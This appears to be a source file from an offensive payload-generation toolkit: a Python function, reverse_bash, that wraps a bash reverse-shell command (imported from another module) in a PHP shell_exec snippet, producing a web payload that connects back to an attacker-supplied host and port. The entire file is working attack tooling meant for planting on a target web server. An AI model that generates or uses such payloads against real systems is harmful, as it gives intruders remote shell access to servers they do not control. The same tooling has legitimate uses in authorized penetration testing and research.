__all__ = ['reverse_bash']

from json import dumps as to_json

from ...cmd.unix import reverse_bash as bash_cmd
from ...util import kwdefaults_from


def _php_escape(__s: str) -> str:
    return to_json(__s, ensure_ascii=False).replace('$', r'\$')


@kwdefaults_from(bash_cmd)
def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
    s = _php_escape(bash_cmd(lhost, lport, **kwargs))
    return f"<pre><?= shell_exec({s}) ?></pre>"
